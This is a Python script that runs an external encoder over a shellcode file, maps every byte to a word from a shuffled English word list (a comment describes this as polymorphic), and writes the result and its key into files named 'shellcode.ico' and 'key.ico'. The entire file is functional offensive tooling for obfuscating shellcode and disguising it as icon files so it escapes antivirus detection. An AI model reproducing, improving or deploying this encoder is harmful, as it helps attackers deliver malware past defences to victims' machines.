import random
import sys
import subprocess
import os



def sgnEnc(fileName):
    
    exe_path = "sgn\\sgn.exe"   
    arguments = ['-o', 'res.bin', '-c', '17', '-max', '20', '-a', '64', '{}'.format(fileName)]

    process = subprocess.Popen(
        [exe_path] + arguments, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

    output, error = process.communicate()
    if process.returncode != 0:
        print("Error during encryption process:", error.decode())
        sys.exit(1)
    
    with open("res.bin", "rb") as f:
        shellcode = f.read()

    return shellcode

ascii_strings = [
    'Ably', 'Afar', 'Area', 'Army', 'Away', 'Baby', 'Back', 'Ball', 'Band', 'Bank', 'Base', 'Bear', 'Beat', 'Bill', 'Body', 'Book',
    'Burn', 'Call', 'Card', 'Care', 'Case', 'Cash', 'Cast', 'City', 'Club', 'Come', 'Cook', 'Cope', 'Cost', 'Damn', 'Dare', 'Date',
    'Dead', 'Deal', 'Deep', 'Deny', 'Door', 'Down', 'Draw', 'Drop', 'Duly', 'Duty', 'Earn', 'East', 'Easy', 'Edge', 'Else', 'Even',
    'Ever', 'Face', 'Fact', 'Fail', 'Fair', 'Fall', 'Farm', 'Fast', 'Fear', 'Feel', 'File', 'Fill', 'Film', 'Find', 'Fire', 'Firm',
    'Fish', 'Flat', 'Food', 'Foot', 'Form', 'Full', 'Fund', 'Gain', 'Game', 'Girl', 'Give', 'Goal', 'Gold', 'Good', 'Grow', 'Hair',
    'Half', 'Hall', 'Hand', 'Hang', 'Hard', 'Hate', 'Have', 'Head', 'Hear', 'Help', 'Here', 'Hide', 'High', 'Hold', 'Home', 'Hope',
    'Hour', 'Hurt', 'Idea', 'Idly', 'Jack', 'John', 'Join', 'Jump', 'Just', 'Keep', 'Kill', 'Kind', 'King', 'Know', 'Lack', 'Lady',
    'Land', 'Last', 'Late', 'Lead', 'Lend', 'Life', 'Lift', 'Like', 'Line', 'Link', 'List', 'Live', 'Long', 'Look', 'Lord', 'Lose',
    'Loss', 'Loud', 'Love', 'Make', 'Mark', 'Mary', 'Meet', 'Mind', 'Miss', 'Move', 'Much', 'Must', 'Name', 'Near', 'Need', 'News',
    'Nice', 'Note', 'Okay', 'Once', 'Only', 'Open', 'Over', 'Page', 'Pain', 'Pair', 'Park', 'Part', 'Pass', 'Past', 'Path', 'Paul',
    'Pick', 'Plan', 'Play', 'Post', 'Pray', 'Pull', 'Push', 'Rain', 'Rate', 'Read', 'Real', 'Rely', 'Rest', 'Ride', 'Ring', 'Rise',
    'Risk', 'Road', 'Rock', 'Role', 'Roll', 'Room', 'Rule', 'Sale', 'Save', 'Seat', 'Seek', 'Seem', 'Sell', 'Send', 'Shed', 'Shop',
    'Show', 'Shut', 'Side', 'Sign', 'Sing', 'Site', 'Size', 'Skin', 'Slip', 'Slow', 'Solo', 'Soon', 'Sort', 'Star', 'Stay', 'Step',
    'Stop', 'Suit', 'Sure', 'Take', 'Talk', 'Task', 'Team', 'Tell', 'Tend', 'Term', 'Test', 'Text', 'That', 'Then', 'This', 'Thus',
    'Time', 'Tour', 'Town', 'Tree', 'Turn', 'Type', 'Unit', 'User', 'Vary', 'Very', 'View', 'Vote', 'Wait', 'Wake', 'Walk', 'Wall',
    'Want', 'Warn', 'Wash', 'Wear', 'Week', 'When', 'Wide', 'Wife', 'Will', 'Wind', 'Wine', 'Wish', 'Wood', 'Word', 'Work', 'Year'
]
# 多态化 每次table不一样
random.shuffle(ascii_strings)

if len(sys.argv) < 2:
    print("Usage: python script.py <input_file>")
    sys.exit(1)




raw = sgnEnc(sys.argv[1])

encoded = "".join([ascii_strings[x % len(ascii_strings)] + "\x00" for x in raw])

with open("key.ico", "w") as fh:
    fh.write('''"{}"'''.format("\", \"".join(ascii_strings)))

with open("shellcode.ico", "w") as fh:
    fh.write('''{}'''.format(encoded.replace('"', '\\"')))